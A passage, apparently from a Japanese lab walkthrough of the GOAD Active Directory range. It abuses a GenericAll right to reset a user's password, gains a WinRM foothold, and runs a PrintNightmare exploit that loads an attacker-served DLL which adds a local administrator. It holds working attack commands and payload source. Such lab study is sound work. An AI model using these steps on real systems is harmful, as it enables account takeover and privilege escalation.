</span></span><span class=line><span class=cl><span class=err>#</span> <span class=nx>use</span> <span class=nx>all</span>
</span></span><span class=line><span class=cl><span class=err>#</span> <span class=nx>ls</span>
</span></span><span class=line><span class=cl><span class=nx>drw</span><span class=o>-</span><span class=nx>rw</span><span class=o>-</span><span class=nx>rw</span><span class=o>-</span>          <span class=mi>0</span>  <span class=nx>Sun</span> <span class=nx>Oct</span> <span class=mi>20</span> <span class=mi>01</span><span class=o>:</span><span class=mi>17</span><span class=o>:</span><span class=mi>14</span> <span class=mi>2024</span> <span class=p>.</span>
</span></span><span class=line><span class=cl><span class=nx>drw</span><span class=o>-</span><span class=nx>rw</span><span class=o>-</span><span class=nx>rw</span><span class=o>-</span>          <span class=mi>0</span>  <span class=nx>Sun</span> <span class=nx>Oct</span> <span class=mi>20</span> <span class=mi>01</span><span class=o>:</span><span class=mi>17</span><span class=o>:</span><span class=mi>14</span> <span class=mi>2024</span> <span class=p>..</span>
</span></span><span class=line><span class=cl><span class=err>#</span> <span class=nx>cd</span> <span class=p>..</span>
</span></span><span class=line><span class=cl><span class=err>#</span> <span class=nx>ls</span>
</span></span><span class=line><span class=cl><span class=nx>drw</span><span class=o>-</span><span class=nx>rw</span><span class=o>-</span><span class=nx>rw</span><span class=o>-</span>          <span class=mi>0</span>  <span class=nx>Sun</span> <span class=nx>Oct</span> <span class=mi>20</span> <span class=mi>01</span><span class=o>:</span><span class=mi>17</span><span class=o>:</span><span class=mi>14</span> <span class=mi>2024</span> <span class=p>.</span>
</span></span><span class=line><span class=cl><span class=nx>drw</span><span class=o>-</span><span class=nx>rw</span><span class=o>-</span><span class=nx>rw</span><span class=o>-</span>          <span class=mi>0</span>  <span class=nx>Sun</span> <span class=nx>Oct</span> <span class=mi>20</span> <span class=mi>01</span><span class=o>:</span><span class=mi>17</span><span class=o>:</span><span class=mi>14</span> <span class=mi>2024</span> <span class=p>..</span>
</span></span><span class=line><span class=cl><span class=err>#</span> <span class=nx>use</span> <span class=kr>public</span>
</span></span><span class=line><span class=cl><span class=err>#</span> <span class=nx>ls</span>
</span></span><span class=line><span class=cl><span class=nx>drw</span><span class=o>-</span><span class=nx>rw</span><span class=o>-</span><span class=nx>rw</span><span class=o>-</span>          <span class=mi>0</span>  <span class=nx>Sun</span> <span class=nx>Oct</span> <span class=mi>20</span> <span class=mi>01</span><span class=o>:</span><span class=mi>17</span><span class=o>:</span><span class=mi>14</span> <span class=mi>2024</span> <span class=p>.</span>
</span></span><span class=line><span class=cl><span class=nx>drw</span><span class=o>-</span><span class=nx>rw</span><span class=o>-</span><span class=nx>rw</span><span class=o>-</span>          <span class=mi>0</span>  <span class=nx>Sun</span> <span class=nx>Oct</span> <span class=mi>20</span> <span class=mi>01</span><span class=o>:</span><span class=mi>17</span><span class=o>:</span><span class=mi>14</span> <span class=mi>2024</span> <span class=p>..</span>
</span></span><span class=line><span class=cl><span class=err>#</span> <span class=nx>use</span> <span class=nx>CertEnroll</span>
</span></span><span class=line><span class=cl><span class=err>#</span> <span class=nx>ls</span>
</span></span><span class=line><span class=cl><span class=nx>drw</span><span class=o>-</span><span class=nx>rw</span><span class=o>-</span><span class=nx>rw</span><span class=o>-</span>          <span class=mi>0</span>  <span class=nx>Fri</span> <span class=nx>Oct</span> <span class=mi>18</span> <span class=mi>21</span><span class=o>:</span><span class=mi>33</span><span class=o>:</span><span class=mi>44</span> <span class=mi>2024</span> <span class=p>.</span>
</span></span><span class=line><span class=cl><span class=nx>drw</span><span class=o>-</span><span class=nx>rw</span><span class=o>-</span><span class=nx>rw</span><span class=o>-</span>          <span class=mi>0</span>  <span class=nx>Fri</span> <span class=nx>Oct</span> <span class=mi>18</span> <span class=mi>21</span><span class=o>:</span><span class=mi>33</span><span class=o>:</span><span class=mi>44</span> <span class=mi>2024</span> <span class=p>..</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=nx>rw</span><span class=o>-</span><span class=nx>rw</span><span class=o>-</span><span class=nx>rw</span><span class=o>-</span>        <span class=mi>865</span>  <span class=nx>Sat</span> <span class=nx>Aug</span> <span class=mi>10</span> <span class=mi>23</span><span class=o>:</span><span class=mi>47</span><span class=o>:</span><span class=mi>50</span> <span class=mi>2024</span> <span class=nx>braavos</span><span class=p>.</span><span class=nx>essos</span><span class=p>.</span><span class=nx>local_ESSOS</span><span class=o>-</span><span class=nx>CA</span><span class=p>.</span><span class=nx>crt</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=nx>rw</span><span class=o>-</span><span class=nx>rw</span><span class=o>-</span><span class=nx>rw</span><span class=o>-</span>        <span class=mi>716</span>  <span class=nx>Fri</span> <span class=nx>Oct</span> <span class=mi>18</span> <span class=mi>21</span><span class=o>:</span><span class=mi>33</span><span class=o>:</span><span class=mi>44</span> <span class=mi>2024</span> <span class=nx>ESSOS</span><span class=o>-</span><span class=nx>CA</span><span class=o>+</span><span class=p>.</span><span class=nx>crl</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=nx>rw</span><span class=o>-</span><span class=nx>rw</span><span class=o>-</span><span class=nx>rw</span><span class=o>-</span>        <span class=mi>902</span>  <span class=nx>Sat</span> <span class=nx>Oct</span> <span class=mi>12</span> <span class=mi>22</span><span class=o>:</span><span class=mi>15</span><span class=o>:</span><span class=mi>56</span> <span class=mi>2024</span> <span class=nx>ESSOS</span><span class=o>-</span><span class=nx>CA</span><span class=p>.</span><span class=nx>crl</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=nx>rw</span><span class=o>-</span><span class=nx>rw</span><span class=o>-</span><span class=nx>rw</span><span class=o>-</span>        <span class=mi>320</span>  <span class=nx>Sat</span> <span class=nx>Aug</span> <span class=mi>10</span> <span class=mi>23</span><span class=o>:</span><span class=mi>47</span><span class=o>:</span><span class=mi>52</span> <span class=mi>2024</span> <span class=nx>nsrev_ESSOS</span><span class=o>-</span><span class=nx>CA</span><span class=p>.</span><span class=nx>asp</span>
</span></span><span class=line><span class=cl><span class=err>#</span> <span class=nx>exit</span>
</span></span></code></pre></div><p>missandeiはkhal.dragoというユーザに対してGenericAllの権限を持っている。</p><p>そこでkhal.drogoのパスワードを変更する。</p><p>使用するツールはldap_shell</p><p><a href=https://github.com/PShlyundin/ldap_shell>https://github.com/PShlyundin/ldap_shell</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>┌──</span><span class=p>(</span><span class=nx>kali</span><span class=err>㉿</span><span class=nx>kali</span><span class=p>)</span><span class=o>-</span><span class=p>[</span><span class=o>~</span><span class=err>/goad/braavos]</span>
</span></span><span class=line><span class=cl><span class=err>└─</span><span class=nx>$</span> <span class=nx>ldap_shell</span> <span class=nx>essos</span><span class=p>.</span><span class=nx>local</span><span class=o>/</span><span class=nx>missandei</span> <span class=o>-</span><span class=nx>dc</span><span class=o>-</span><span class=nx>host</span> <span class=nx>essos</span><span class=p>.</span><span class=nx>local</span>
</span></span><span class=line><span class=cl><span class=nx>Password</span><span class=o>:</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nx>INFO</span><span class=p>]</span> <span class=nx>Starting</span> <span class=nx>interactive</span> <span class=nx>shell</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=nx>missandei</span><span class=err>#</span>
</span></span><span class=line><span class=cl><span class=nx>missandei</span><span class=err>#</span> <span class=nx>change_password</span> <span class=nx>khal</span><span class=p>.</span><span class=nx>drogo</span> <span class=nx>horse</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nx>INFO</span><span class=p>]</span> <span class=nx>Got</span> <span class=nx>User</span> <span class=nx>DN</span><span class=o>:</span> <span class=nx>CN</span><span class=o>=</span><span class=nx>khal</span><span class=p>.</span><span class=nx>drogo</span><span class=p>,</span><span class=nx>CN</span><span class=o>=</span><span class=nx>Users</span><span class=p>,</span><span class=nx>DC</span><span class=o>=</span><span class=nx>essos</span><span class=p>,</span><span class=nx>DC</span><span class=o>=</span><span class=nx>local</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nx>INFO</span><span class=p>]</span> <span class=nx>Attempting</span> <span class=nx>to</span> <span class=nx>set</span> <span class=k>new</span> <span class=nx>password</span> <span class=k>of</span><span class=o>:</span> <span class=nx>horse</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nx>INFO</span><span class=p>]</span> <span class=nx>Password</span> <span class=nx>changed</span> <span class=nx>successfully</span><span class=o>!</span>
</span></span></code></pre></div><p>というわけで <code>khal.drogo/horse</code> というクレデンシャルをゲット。</p><p>試しに確認するとちゃんと認証情報を取得できていることがわかる</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>┌──</span><span class=p>(</span><span class=nx>kali</span><span class=err>㉿</span><span class=nx>kali</span><span class=p>)</span><span class=o>-</span><span class=p>[</span><span class=o>~</span><span class=err>/goad/braavos]</span>
</span></span><span class=line><span class=cl><span class=err>└─</span><span class=nx>$</span> <span class=nx>nxc</span> <span class=nx>smb</span> <span class=nx>braavos</span> <span class=o>-</span><span class=nx>u</span> <span class=nx>khal</span><span class=p>.</span><span class=nx>drogo</span> <span class=o>-</span><span class=nx>p</span> <span class=nx>horse</span>                            
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.23</span>   <span class=mi>445</span>    <span class=nx>BRAAVOS</span>          <span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Windows</span> <span class=nx>Server</span> <span class=mi>2016</span> <span class=nx>Standard</span> <span class=nx>Evaluation</span> <span class=mi>14393</span> <span class=nx>x64</span> <span class=p>(</span><span class=nx>name</span><span class=o>:</span><span class=nx>BRAAVOS</span><span class=p>)</span> <span class=p>(</span><span class=nx>domain</span><span class=o>:</span><span class=nx>essos</span><span class=p>.</span><span class=nx>local</span><span class=p>)</span> <span class=p>(</span><span class=nx>signing</span><span class=o>:</span><span class=nx>False</span><span class=p>)</span> <span class=p>(</span><span class=nx>SMBv1</span><span class=o>:</span><span class=nx>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.23</span>   <span class=mi>445</span>    <span class=nx>BRAAVOS</span>          <span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>essos</span><span class=p>.</span><span class=nx>local</span><span class=err>\</span><span class=nx>khal</span><span class=p>.</span><span class=nx>drogo</span><span class=o>:</span><span class=nx>horse</span> <span class=p>(</span><span class=nx>Pwn3d</span><span class=o>!</span><span class=p>)</span>
</span></span></code></pre></div><p>winrmも認証通りそうですね</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>┌──</span><span class=p>(</span><span class=nx>kali</span><span class=err>㉿</span><span class=nx>kali</span><span class=p>)</span><span class=o>-</span><span class=p>[</span><span class=o>~</span><span class=err>/goad/braavos]</span>
</span></span><span class=line><span class=cl><span class=err>└─</span><span class=nx>$</span> <span class=nx>nxc</span> <span class=nx>winrm</span> <span class=nx>braavos</span> <span class=o>-</span><span class=nx>u</span> <span class=nx>khal</span><span class=p>.</span><span class=nx>drogo</span> <span class=o>-</span><span class=nx>p</span> <span class=nx>horse</span> 
</span></span><span class=line><span class=cl><span class=nx>WINRM</span>       <span class=mf>192.168.56.23</span>   <span class=mi>5985</span>   <span class=nx>BRAAVOS</span>          <span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Windows</span> <span class=mi>10</span> <span class=o>/</span> <span class=nx>Server</span> <span class=mi>2016</span> <span class=nx>Build</span> <span class=mi>14393</span> <span class=p>(</span><span class=nx>name</span><span class=o>:</span><span class=nx>BRAAVOS</span><span class=p>)</span> <span class=p>(</span><span class=nx>domain</span><span class=o>:</span><span class=nx>essos</span><span class=p>.</span><span class=nx>local</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>WINRM</span>       <span class=mf>192.168.56.23</span>   <span class=mi>5985</span>   <span class=nx>BRAAVOS</span>          <span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>essos</span><span class=p>.</span><span class=nx>local</span><span class=err>\</span><span class=nx>khal</span><span class=p>.</span><span class=nx>drogo</span><span class=o>:</span><span class=nx>horse</span> <span class=p>(</span><span class=nx>Pwn3d</span><span class=o>!</span><span class=p>)</span>
</span></span></code></pre></div><p>とりあえずevil-winrmで足がかりはできた</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>┌──</span><span class=p>(</span><span class=nx>kali</span><span class=err>㉿</span><span class=nx>kali</span><span class=p>)</span><span class=o>-</span><span class=p>[</span><span class=o>~</span><span class=err>/goad/braavos]</span>
</span></span><span class=line><span class=cl><span class=err>└─</span><span class=nx>$</span> <span class=nx>evil</span><span class=o>-</span><span class=nx>winrm</span> <span class=o>-</span><span class=nx>u</span> <span class=nx>khal</span><span class=p>.</span><span class=nx>drogo</span> <span class=o>-</span><span class=nx>p</span> <span class=nx>horse</span> <span class=o>-</span><span class=nx>i</span> <span class=nx>braavos</span>               
</span></span><span class=line><span class=cl>                                        
</span></span><span class=line><span class=cl><span class=nx>Evil</span><span class=o>-</span><span class=nx>WinRM</span> <span class=nx>shell</span> <span class=nx>v3</span><span class=mf>.5</span>
</span></span><span class=line><span class=cl>                                        
</span></span><span class=line><span class=cl><span class=nx>Warning</span><span class=o>:</span> <span class=nx>Remote</span> <span class=nx>path</span> <span class=nx>completions</span> <span class=nx>is</span> <span class=nx>disabled</span> <span class=nx>due</span> <span class=nx>to</span> <span class=nx>ruby</span> <span class=nx>limitation</span><span class=o>:</span> <span class=nx>quoting_detection_proc</span><span class=p>()</span> <span class=kd>function</span> <span class=nx>is</span> <span class=nx>unimplemented</span> <span class=nx>on</span> <span class=k>this</span> <span class=nx>machine</span>
</span></span><span class=line><span class=cl>                                        
</span></span><span class=line><span class=cl><span class=nx>Data</span><span class=o>:</span> <span class=nx>For</span> <span class=nx>more</span> <span class=nx>information</span><span class=p>,</span> <span class=nx>check</span> <span class=nx>Evil</span><span class=o>-</span><span class=nx>WinRM</span> <span class=nx>GitHub</span><span class=o>:</span> <span class=nx>https</span><span class=o>:</span><span class=c1>//github.com/Hackplayers/evil-winrm#Remote-path-completion
</span></span></span><span class=line><span class=cl><span class=c1></span>                                        
</span></span><span class=line><span class=cl><span class=nx>Info</span><span class=o>:</span> <span class=nx>Establishing</span> <span class=nx>connection</span> <span class=nx>to</span> <span class=nx>remote</span> <span class=nx>endpoint</span>
</span></span><span class=line><span class=cl><span class=o>*</span><span class=nx>Evil</span><span class=o>-</span><span class=nx>WinRM</span><span class=o>*</span> <span class=nx>PS</span> <span class=nx>C</span><span class=o>:</span><span class=err>\</span><span class=nx>Users</span><span class=err>\</span><span class=nx>khal</span><span class=p>.</span><span class=nx>drogo</span><span class=err>\</span><span class=nx>Documents</span><span class=o>&gt;</span> 
</span></span></code></pre></div><p>Printnightmareが刺さるか調査</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>┌──</span><span class=p>(</span><span class=nx>kali</span><span class=err>㉿</span><span class=nx>kali</span><span class=p>)</span><span class=o>-</span><span class=p>[</span><span class=o>~</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=err>└─</span><span class=nx>$</span> <span class=nx>netexec</span> <span class=o>--</span><span class=nx>version</span>               
</span></span><span class=line><span class=cl><span class=mf>1.3.0</span> <span class=o>-</span> <span class=nx>NeedForSpeed</span> <span class=o>-</span> <span class=nx>Kali</span> <span class=nx>Linux</span>
</span></span><span class=line><span class=cl>                                                                                                                                                                                                                                                                                                                            
</span></span><span class=line><span class=cl><span class=err>┌──</span><span class=p>(</span><span class=nx>kali</span><span class=err>㉿</span><span class=nx>kali</span><span class=p>)</span><span class=o>-</span><span class=p>[</span><span class=o>~</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=err>└─</span><span class=nx>$</span> <span class=nx>nxc</span> <span class=nx>smb</span> <span class=mf>192.168.56.10</span><span class=o>-</span><span class=mi>23</span> <span class=o>-</span><span class=nx>M</span> <span class=nx>spooler</span>
</span></span><span class=line><span class=cl><span class=err>/usr/lib/python3/dist-packages/masky/core.py:102: SyntaxWarning: invalid escape sequence &#39;\{&#39;</span>
</span></span><span class=line><span class=cl>  <span class=nx>f</span><span class=s2>&#34;Start processing PFX of the user &#39;{user_data.domain}\{user_data.name}&#39;&#34;</span>
</span></span><span class=line><span class=cl><span class=err>/usr/lib/python3/dist-packages/masky/core.py:106: SyntaxWarning: invalid escape sequence &#39;\{&#39;</span>
</span></span><span class=line><span class=cl>  <span class=nx>f</span><span class=s2>&#34;Fail to process gathered certificate related to the user &#39;{user_data.domain}\{user_data.name}&#39;&#34;</span>
</span></span><span class=line><span class=cl><span class=err>/usr/lib/python3/dist-packages/masky/core.py:110: SyntaxWarning: invalid escape sequence &#39;\{&#39;</span>
</span></span><span class=line><span class=cl>  <span class=nx>f</span><span class=s2>&#34;End processing PFX of the user &#39;{user_data.domain}\{user_data.name}&#39;&#34;</span>
</span></span><span class=line><span class=cl><span class=err>/usr/lib/python3/dist-packages/masky/lib/smb.py:85: SyntaxWarning: invalid escape sequence &#39;\{&#39;</span>
</span></span><span class=line><span class=cl>  <span class=nx>err_msg</span> <span class=o>=</span> <span class=nx>f</span><span class=s2>&#34;The user {self.__domain}\{self.__username} is not local administrator on this system&#34;</span>
</span></span><span class=line><span class=cl><span class=err>/usr/lib/python3/dist-packages/masky/lib/smb.py:88: SyntaxWarning: invalid escape sequence &#39;\{&#39;</span>
</span></span><span class=line><span class=cl>  <span class=nx>err_msg</span> <span class=o>=</span> <span class=nx>f</span><span class=s2>&#34;The provided credentials for the user &#39;{self.__domain}\{self.__username}&#39; are invalids or the user does not exist&#34;</span>
</span></span><span class=line><span class=cl><span class=err>/usr/lib/python3/dist-packages/masky/lib/smb.py:257: SyntaxWarning: invalid escape sequence &#39;\p&#39;</span>
</span></span><span class=line><span class=cl>  <span class=nx>np_bind</span> <span class=o>=</span> <span class=nx>f</span><span class=s2>&#34;ncacn_np:{target_host}[\pipe\svcctl]&#34;</span>
</span></span><span class=line><span class=cl><span class=err>/usr/lib/python3/dist-packages/masky/lib/cert/auth.py:413: SyntaxWarning: invalid escape sequence &#39;\{&#39;</span>
</span></span><span class=line><span class=cl>  <span class=nx>f</span><span class=s2>&#34;Gathered NT hash for the user &#39;{domain}\{username}&#39;: {nt_hash}&#34;</span>
</span></span><span class=line><span class=cl><span class=err>/usr/lib/python3/dist-packages/pypykatz/_version.py:11: SyntaxWarning: invalid escape sequence &#39;\.&#39;</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;&#34;</span><span class=err>&#34;</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.12</span>   <span class=mi>445</span>    <span class=nx>MEEREEN</span>          <span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Windows</span> <span class=nx>Server</span> <span class=mi>2016</span> <span class=nx>Standard</span> <span class=nx>Evaluation</span> <span class=mi>14393</span> <span class=nx>x64</span> <span class=p>(</span><span class=nx>name</span><span class=o>:</span><span class=nx>MEEREEN</span><span class=p>)</span> <span class=p>(</span><span class=nx>domain</span><span class=o>:</span><span class=nx>essos</span><span class=p>.</span><span class=nx>local</span><span class=p>)</span> <span class=p>(</span><span class=nx>signing</span><span class=o>:</span><span class=nx>True</span><span class=p>)</span> <span class=p>(</span><span class=nx>SMBv1</span><span class=o>:</span><span class=nx>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.10</span>   <span class=mi>445</span>    <span class=nx>KINGSLANDING</span>     <span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Windows</span> <span class=mi>10</span> <span class=o>/</span> <span class=nx>Server</span> <span class=mi>2019</span> <span class=nx>Build</span> <span class=mi>17763</span> <span class=nx>x64</span> <span class=p>(</span><span class=nx>name</span><span class=o>:</span><span class=nx>KINGSLANDING</span><span class=p>)</span> <span class=p>(</span><span class=nx>domain</span><span class=o>:</span><span class=nx>sevenkingdoms</span><span class=p>.</span><span class=nx>local</span><span class=p>)</span> <span class=p>(</span><span class=nx>signing</span><span class=o>:</span><span class=nx>True</span><span class=p>)</span> <span class=p>(</span><span class=nx>SMBv1</span><span class=o>:</span><span class=nx>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.11</span>   <span class=mi>445</span>    <span class=nx>WINTERFELL</span>       <span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Windows</span> <span class=mi>10</span> <span class=o>/</span> <span class=nx>Server</span> <span class=mi>2019</span> <span class=nx>Build</span> <span class=mi>17763</span> <span class=nx>x64</span> <span class=p>(</span><span class=nx>name</span><span class=o>:</span><span class=nx>WINTERFELL</span><span class=p>)</span> <span class=p>(</span><span class=nx>domain</span><span class=o>:</span><span class=nx>north</span><span class=p>.</span><span class=nx>sevenkingdoms</span><span class=p>.</span><span class=nx>local</span><span class=p>)</span> <span class=p>(</span><span class=nx>signing</span><span class=o>:</span><span class=nx>True</span><span class=p>)</span> <span class=p>(</span><span class=nx>SMBv1</span><span class=o>:</span><span class=nx>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.22</span>   <span class=mi>445</span>    <span class=nx>CASTELBLACK</span>      <span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Windows</span> <span class=mi>10</span> <span class=o>/</span> <span class=nx>Server</span> <span class=mi>2019</span> <span class=nx>Build</span> <span class=mi>17763</span> <span class=nx>x64</span> <span class=p>(</span><span class=nx>name</span><span class=o>:</span><span class=nx>CASTELBLACK</span><span class=p>)</span> <span class=p>(</span><span class=nx>domain</span><span class=o>:</span><span class=nx>north</span><span class=p>.</span><span class=nx>sevenkingdoms</span><span class=p>.</span><span class=nx>local</span><span class=p>)</span> <span class=p>(</span><span class=nx>signing</span><span class=o>:</span><span class=nx>False</span><span class=p>)</span> <span class=p>(</span><span class=nx>SMBv1</span><span class=o>:</span><span class=nx>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.23</span>   <span class=mi>445</span>    <span class=nx>BRAAVOS</span>          <span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Windows</span> <span class=nx>Server</span> <span class=mi>2016</span> <span class=nx>Standard</span> <span class=nx>Evaluation</span> <span class=mi>14393</span> <span class=nx>x64</span> <span class=p>(</span><span class=nx>name</span><span class=o>:</span><span class=nx>BRAAVOS</span><span class=p>)</span> <span class=p>(</span><span class=nx>domain</span><span class=o>:</span><span class=nx>essos</span><span class=p>.</span><span class=nx>local</span><span class=p>)</span> <span class=p>(</span><span class=nx>signing</span><span class=o>:</span><span class=nx>False</span><span class=p>)</span> <span class=p>(</span><span class=nx>SMBv1</span><span class=o>:</span><span class=nx>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>SPOOLER</span>     <span class=mf>192.168.56.12</span>   <span class=mi>445</span>    <span class=nx>MEEREEN</span>          <span class=nx>Spooler</span> <span class=nx>service</span> <span class=nx>enabled</span>
</span></span><span class=line><span class=cl><span class=nx>SPOOLER</span>     <span class=mf>192.168.56.22</span>   <span class=mi>445</span>    <span class=nx>CASTELBLACK</span>      <span class=nx>Spooler</span> <span class=nx>service</span> <span class=nx>enabled</span>
</span></span><span class=line><span class=cl><span class=nx>SPOOLER</span>     <span class=mf>192.168.56.11</span>   <span class=mi>445</span>    <span class=nx>WINTERFELL</span>       <span class=nx>Spooler</span> <span class=nx>service</span> <span class=nx>enabled</span>
</span></span><span class=line><span class=cl><span class=nx>SPOOLER</span>     <span class=mf>192.168.56.10</span>   <span class=mi>445</span>    <span class=nx>KINGSLANDING</span>     <span class=nx>Spooler</span> <span class=nx>service</span> <span class=nx>enabled</span>
</span></span><span class=line><span class=cl><span class=nx>SPOOLER</span>     <span class=mf>192.168.56.23</span>   <span class=mi>445</span>    <span class=nx>BRAAVOS</span>          <span class=nx>Spooler</span> <span class=nx>service</span> <span class=nx>enabled</span>
</span></span><span class=line><span class=cl><span class=nx>Running</span> <span class=nx>nxc</span> <span class=nx>against</span> <span class=mi>14</span> <span class=nx>targets</span> <span class=err>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span> <span class=mi>100</span><span class=o>%</span> <span class=mi>0</span><span class=o>:</span><span class=mi>00</span><span class=o>:</span><span class=mi>00</span>
</span></span></code></pre></div><p>次のようなCのコードでdllを作成し実行する</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>#</span><span class=nx>include</span> <span class=p>&lt;</span><span class=nt>windows.h</span><span class=p>&gt;</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>int</span> <span class=nx>RunCMD</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>system</span><span class=p>(</span><span class=s2>&#34;net users pnightmare Passw0rd123. /add&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>system</span><span class=p>(</span><span class=s2>&#34;net localgroup administrators pnightmare /add&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>BOOL</span> <span class=nx>APIENTRY</span> <span class=nx>DllMain</span><span class=p>(</span><span class=nx>HMODULE</span> <span class=nx>hModule</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nx>DWORD</span> <span class=nx>ul_reason_for_call</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nx>LPVOID</span> <span class=nx>lpReserved</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>switch</span> <span class=p>(</span><span class=nx>ul_reason_for_call</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=nx>DLL_PROCESS_ATTACH</span><span class=o>:</span>
</span></span><span class=line><span class=cl>        <span class=nx>RunCMD</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=nx>DLL_THREAD_ATTACH</span><span class=o>:</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=nx>DLL_THREAD_DETACH</span><span class=o>:</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=nx>DLL_PROCESS_DETACH</span><span class=o>:</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>TRUE</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>コンパイル</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=nx>x86_64</span><span class=o>-</span><span class=nx>w64</span><span class=o>-</span><span class=nx>mingw32</span><span class=o>-</span><span class=nx>gcc</span> <span class=o>-</span><span class=nx>shared</span> <span class=o>-</span><span class=nx>o</span> <span class=nx>nightmare</span><span class=p>.</span><span class=nx>dll</span> <span class=nx>nightmare</span><span class=p>.</span><span class=nx>c</span>
</span></span></code></pre></div><p>PrintNightmareのコードをクローン</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=nx>git</span> <span class=nx>clone</span> <span class=nx>https</span><span class=o>:</span><span class=c1>//github.com/cube0x0/CVE-2021-1675 printnightmare
</span></span></span></code></pre></div><p>SMBでdllを公開しておく</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=nx>smbserver</span><span class=p>.</span><span class=nx>py</span> <span class=o>-</span><span class=nx>smb2support</span> <span class=nx>ATTACKERSHARE</span> <span class=p>.</span>
</span></span></code></pre></div><p>で実行</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>┌──</span><span class=p>(</span><span class=nx>kali</span><span class=err>㉿</span><span class=nx>kali</span><span class=p>)</span><span class=o>-</span><span class=p>[</span><span class=o>~</span><span class=err>/goad/printnightmare/printnightmare]</span>
</span></span><span class=line><span class=cl><span class=err>└─</span><span class=nx>$</span> <span class=nx>python3</span> <span class=nx>CVE</span><span class=o>-</span><span class=mi>2021</span><span class=o>-</span><span class=mf>1675.</span><span class=nx>py</span> <span class=nx>essos</span><span class=p>.</span><span class=nx>local</span><span class=o>/</span><span class=nx>khal</span><span class=p>.</span><span class=nx>drogo</span><span class=o>:</span><span class=nx>horse</span><span class=err>@</span><span class=nx>meereen</span><span class=p>.</span><span class=nx>essos</span><span class=p>.</span><span class=nx>local</span> <span class=s1>&#39;\\192.168.56.104\ATTACKSHARE\nightmare.dll&#39;</span>
